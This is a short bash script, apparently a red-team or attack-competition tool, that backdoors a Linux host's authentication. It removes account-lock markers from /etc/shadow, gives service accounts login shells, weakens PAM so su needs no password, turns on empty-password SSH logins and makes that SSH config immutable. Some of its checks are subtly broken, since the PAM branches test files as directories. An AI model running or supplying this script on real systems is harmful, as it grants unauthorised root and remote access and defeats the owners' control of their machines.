#!/bin/bash
#====================================
    echo "Booping teh snoop."
    sed -ie "s/*//g" /etc/shadow
    sed -ie "s/\!//g" /etc/shadow
    sed -ie "s#/usr/sbin/nologin#/bin/bash#g" /etc/passwd
    sed -ie "s#/sbin/nologin#/bin/bash#g" /etc/passwd
    sed -ie "s#/bin/false#/bin/bash#g" /etc/passwd
    sed -ie "s#/bin/true#/bin/bash#g" /etc/passwd
    if [ -d "/etc/pam.d/password-auth" ]; then 
        #centos
        sed -ie "s/nullok_secure/nullok/g" /etc/pam.d/password-auth
        sed -ie "s/try_first_pass//g" /etc/pam.d/password-auth
    fi
    if [ -d "/etc/pam.d/common-auth" ]; then
        #not centos
        sed -ie "s/nullok_secure/nullok/g" /etc/pam.d/common-auth
    fi
    sed -ie "s/pam_rootok.so/pam_permit.so/g" /etc/pam.d/su
    chattr -i /etc/ssh/sshd_config
    sed -ie "s/PermitEmptyPasswords no/PermitEmptyPasswords yes/g" /etc/ssh/sshd_config
    chattr +i /etc/ssh/sshd_config
    ##restart ssh to update config
    /etc/init.d/ssh restart
    echo "Boop Complete. Thank you for flying boop airlines. Have a wonderful day!"
#====================================